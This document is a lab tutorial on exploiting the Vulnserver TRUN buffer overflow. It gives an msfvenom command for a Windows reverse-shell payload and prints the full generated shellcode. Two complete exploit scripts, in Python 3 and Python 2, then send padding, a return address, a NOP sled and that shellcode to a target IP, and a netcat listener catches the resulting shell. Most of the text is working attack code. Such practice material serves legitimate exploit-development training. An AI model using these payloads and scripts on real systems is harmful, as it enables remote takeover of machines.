- We'll use a tool called msfvenom to generate some shell code
- To generate the code type in the following command in kali terminal
	`msfvenom -p windows/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"` and hit enter.
	- -p for payload and set it for windows as we're attacking one
	- In these types of reverse shells we have the victim connect back to us
	- LHOST must provide kali ip
	- LPORT to set listening port
	- EXITFUNC makes our exploit a bit more stable
	- -f for filetype 
	- -a for architecture
	- -b for bad character, ie, the null byte
	- The code looks something like this 
	- Note - Do not copy the semicolon.
```"\xd9\xca\xba\x1c\x0e\x64\x45\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
	"\x52\x31\x50\x17\x83\xe8\xfc\x03\x4c\x1d\x86\xb0\x90\xc9\xc4"
	"\x3b\x68\x0a\xa9\xb2\x8d\x3b\xe9\xa1\xc6\x6c\xd9\xa2\x8a\x80"
	"\x92\xe7\x3e\x12\xd6\x2f\x31\x93\x5d\x16\x7c\x24\xcd\x6a\x1f"
	"\xa6\x0c\xbf\xff\x97\xde\xb2\xfe\xd0\x03\x3e\x52\x88\x48\xed"
	"\x42\xbd\x05\x2e\xe9\x8d\x88\x36\x0e\x45\xaa\x17\x81\xdd\xf5"
	"\xb7\x20\x31\x8e\xf1\x3a\x56\xab\x48\xb1\xac\x47\x4b\x13\xfd"
	"\xa8\xe0\x5a\x31\x5b\xf8\x9b\xf6\x84\x8f\xd5\x04\x38\x88\x22"
	"\x76\xe6\x1d\xb0\xd0\x6d\x85\x1c\xe0\xa2\x50\xd7\xee\x0f\x16"
	"\xbf\xf2\x8e\xfb\xb4\x0f\x1a\xfa\x1a\x86\x58\xd9\xbe\xc2\x3b"
	"\x40\xe7\xae\xea\x7d\xf7\x10\x52\xd8\x7c\xbc\x87\x51\xdf\xa9"
	"\x64\x58\xdf\x29\xe3\xeb\xac\x1b\xac\x47\x3a\x10\x25\x4e\xbd"
	"\x57\x1c\x36\x51\xa6\x9f\x47\x78\x6d\xcb\x17\x12\x44\x74\xfc"
	"\xe2\x69\xa1\x53\xb2\xc5\x1a\x14\x62\xa6\xca\xfc\x68\x29\x34"
	"\x1c\x93\xe3\x5d\xb7\x6e\x64\xa2\xe0\xe2\xf0\x4a\xf3\x02\xe8"
	"\xd6\x7a\xe4\x60\xf7\x2a\xbf\x1c\x6e\x77\x4b\xbc\x6f\xad\x36"
	"\xfe\xe4\x42\xc7\xb1\x0c\x2e\xdb\x26\xfd\x65\x81\xe1\x02\x50"
	"\xad\x6e\x90\x3f\x2d\xf8\x89\x97\x7a\xad\x7c\xee\xee\x43\x26"
	"\x58\x0c\x9e\xbe\xa3\x94\x45\x03\x2d\x15\x0b\x3f\x09\x05\xd5"
	"\xc0\x15\x71\x89\x96\xc3\x2f\x6f\x41\xa2\x99\x39\x3e\x6c\x4d"
	"\xbf\x0c\xaf\x0b\xc0\x58\x59\xf3\x71\x35\x1c\x0c\xbd\xd1\xa8"
	"\x75\xa3\x41\x56\xac\x67\x71\x1d\xec\xce\x1a\xf8\x65\x53\x47"
	"\xfb\x50\x90\x7e\x78\x50\x69\x85\x60\x11\x6c\xc1\x26\xca\x1c"
	"\x5a\xc3\xec\xb3\x5b\xc6"
```

- Open up fuzz2.py and add the copied payload enclosed in paranthesis into a variable named overflow and append it to shellcode as well. fuzz4.py finally looks something like this (python3 code):
```
#!/usr/bin/python3

import sys, socket

overflow = (
"\xd9\xca\xba\x1c\x0e\x64\x45\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\x4c\x1d\x86\xb0\x90\xc9\xc4"
"\x3b\x68\x0a\xa9\xb2\x8d\x3b\xe9\xa1\xc6\x6c\xd9\xa2\x8a\x80"
"\x92\xe7\x3e\x12\xd6\x2f\x31\x93\x5d\x16\x7c\x24\xcd\x6a\x1f"
"\xa6\x0c\xbf\xff\x97\xde\xb2\xfe\xd0\x03\x3e\x52\x88\x48\xed"
"\x42\xbd\x05\x2e\xe9\x8d\x88\x36\x0e\x45\xaa\x17\x81\xdd\xf5"
"\xb7\x20\x31\x8e\xf1\x3a\x56\xab\x48\xb1\xac\x47\x4b\x13\xfd"
"\xa8\xe0\x5a\x31\x5b\xf8\x9b\xf6\x84\x8f\xd5\x04\x38\x88\x22"
"\x76\xe6\x1d\xb0\xd0\x6d\x85\x1c\xe0\xa2\x50\xd7\xee\x0f\x16"
"\xbf\xf2\x8e\xfb\xb4\x0f\x1a\xfa\x1a\x86\x58\xd9\xbe\xc2\x3b"
"\x40\xe7\xae\xea\x7d\xf7\x10\x52\xd8\x7c\xbc\x87\x51\xdf\xa9"
"\x64\x58\xdf\x29\xe3\xeb\xac\x1b\xac\x47\x3a\x10\x25\x4e\xbd"
"\x57\x1c\x36\x51\xa6\x9f\x47\x78\x6d\xcb\x17\x12\x44\x74\xfc"
"\xe2\x69\xa1\x53\xb2\xc5\x1a\x14\x62\xa6\xca\xfc\x68\x29\x34"
"\x1c\x93\xe3\x5d\xb7\x6e\x64\xa2\xe0\xe2\xf0\x4a\xf3\x02\xe8"
"\xd6\x7a\xe4\x60\xf7\x2a\xbf\x1c\x6e\x77\x4b\xbc\x6f\xad\x36"
"\xfe\xe4\x42\xc7\xb1\x0c\x2e\xdb\x26\xfd\x65\x81\xe1\x02\x50"
"\xad\x6e\x90\x3f\x2d\xf8\x89\x97\x7a\xad\x7c\xee\xee\x43\x26"
"\x58\x0c\x9e\xbe\xa3\x94\x45\x03\x2d\x15\x0b\x3f\x09\x05\xd5"
"\xc0\x15\x71\x89\x96\xc3\x2f\x6f\x41\xa2\x99\x39\x3e\x6c\x4d"
"\xbf\x0c\xaf\x0b\xc0\x58\x59\xf3\x71\x35\x1c\x0c\xbd\xd1\xa8"
"\x75\xa3\x41\x56\xac\x67\x71\x1d\xec\xce\x1a\xf8\x65\x53\x47"
"\xfb\x50\x90\x7e\x78\x50\x69\x85\x60\x11\x6c\xc1\x26\xca\x1c"
"\x5a\xc3\xec\xb3\x5b\xc6")

shellcode = "A"*2003  + "\xaf\x11\x50\x62" + "\x90"*32 + overflow


try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.18.176.193',9999))

		payload= "TRUN /.:/" + shellcode
        s.send((payload.encode()))
        s.close()

except:
        print ("error Connecing to server")
        sys.exit()
```

- If that doesn't work try (python2 code):
```
#!/usr/bin/python

import sys, socket

overflow = (
"\xd9\xca\xba\x1c\x0e\x64\x45\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\x4c\x1d\x86\xb0\x90\xc9\xc4"
"\x3b\x68\x0a\xa9\xb2\x8d\x3b\xe9\xa1\xc6\x6c\xd9\xa2\x8a\x80"
"\x92\xe7\x3e\x12\xd6\x2f\x31\x93\x5d\x16\x7c\x24\xcd\x6a\x1f"
"\xa6\x0c\xbf\xff\x97\xde\xb2\xfe\xd0\x03\x3e\x52\x88\x48\xed"
"\x42\xbd\x05\x2e\xe9\x8d\x88\x36\x0e\x45\xaa\x17\x81\xdd\xf5"
"\xb7\x20\x31\x8e\xf1\x3a\x56\xab\x48\xb1\xac\x47\x4b\x13\xfd"
"\xa8\xe0\x5a\x31\x5b\xf8\x9b\xf6\x84\x8f\xd5\x04\x38\x88\x22"
"\x76\xe6\x1d\xb0\xd0\x6d\x85\x1c\xe0\xa2\x50\xd7\xee\x0f\x16"
"\xbf\xf2\x8e\xfb\xb4\x0f\x1a\xfa\x1a\x86\x58\xd9\xbe\xc2\x3b"
"\x40\xe7\xae\xea\x7d\xf7\x10\x52\xd8\x7c\xbc\x87\x51\xdf\xa9"
"\x64\x58\xdf\x29\xe3\xeb\xac\x1b\xac\x47\x3a\x10\x25\x4e\xbd"
"\x57\x1c\x36\x51\xa6\x9f\x47\x78\x6d\xcb\x17\x12\x44\x74\xfc"
"\xe2\x69\xa1\x53\xb2\xc5\x1a\x14\x62\xa6\xca\xfc\x68\x29\x34"
"\x1c\x93\xe3\x5d\xb7\x6e\x64\xa2\xe0\xe2\xf0\x4a\xf3\x02\xe8"
"\xd6\x7a\xe4\x60\xf7\x2a\xbf\x1c\x6e\x77\x4b\xbc\x6f\xad\x36"
"\xfe\xe4\x42\xc7\xb1\x0c\x2e\xdb\x26\xfd\x65\x81\xe1\x02\x50"
"\xad\x6e\x90\x3f\x2d\xf8\x89\x97\x7a\xad\x7c\xee\xee\x43\x26"
"\x58\x0c\x9e\xbe\xa3\x94\x45\x03\x2d\x15\x0b\x3f\x09\x05\xd5"
"\xc0\x15\x71\x89\x96\xc3\x2f\x6f\x41\xa2\x99\x39\x3e\x6c\x4d"
"\xbf\x0c\xaf\x0b\xc0\x58\x59\xf3\x71\x35\x1c\x0c\xbd\xd1\xa8"
"\x75\xa3\x41\x56\xac\x67\x71\x1d\xec\xce\x1a\xf8\x65\x53\x47"
"\xfb\x50\x90\x7e\x78\x50\x69\x85\x60\x11\x6c\xc1\x26\xca\x1c"
"\x5a\xc3\xec\xb3\x5b\xc6")

shellcode = "A"*2003  + "\xaf\x11\x50\x62" + "\x90"*32 + overflow


try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.18.178.72',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "error Connecing to server"
        sys.exit()
```

- Now what's going to happen is we're going to submit the shellcode, in the variable shellcode 2003 bytes will get us to the EIP, when we get to the EIP we're going to hit this pointer address, ie, the JMP address which is a set of instructions we provide, and what we're providing is this overflow here, that is, our malicious code!.
- Now what we need to do before submitting our overflow is, insert something called no ops as you see - `"\x90" * 32`.
- no ops are padding essentially and they stand for no operation.
- We're adding a little bit of padding between this JMP command and this overflow shell and sometimes this might not work and we might not get command execution as something interfered here. Hence we add this padding just to be safe.
- On another terminal tab let's setup netcat to listen by typing `nc -nvlp 4444`
	- -n for ip address
	- -v for verbose
	- -l for listen or inbound connect
	- -p for port number
- Lastly what we need to do is to run vulnserver as administrator without immunity debugger.
- And finally fire off this script.
- And there you go! Our listening port establishes a connection to vulnserver and the machine is all ours.